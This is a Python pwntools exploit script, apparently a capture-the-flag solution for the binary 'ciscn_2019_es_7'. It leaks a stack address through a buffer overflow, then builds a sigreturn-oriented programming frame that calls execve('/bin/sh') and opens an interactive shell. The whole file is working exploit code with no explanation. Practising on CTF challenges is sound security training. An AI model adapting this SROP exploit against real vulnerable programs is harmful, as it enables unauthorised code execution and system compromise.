from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
io = process('ciscn_2019_es_7')
# io = remote('node4.buuoj.cn', 29979)
elf = ELF('ciscn_2019_es_7')
mov_rax_0xf_ret = 0x4004DA
syscall_ret = 0x400517
vuln = 0x4004F1

payload = cyclic(0x10) + p64(vuln)
io.sendline(payload)
stack_addr = u64(io.recvn(0x28)[-8:])
log.success('stack_addr: ' + hex(stack_addr))

sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = stack_addr - 0x110
sigframe.rsi = 0x0
sigframe.rdx = 0x0
sigframe.rsp = stack_addr
sigframe.rip = syscall_ret
payload = b'/bin/sh\x00' + cyclic(8) + p64(mov_rax_0xf_ret) + p64(syscall_ret) + bytes(sigframe)
# gdb.attach(io)
# pause()
io.sendline(payload)
io.interactive()

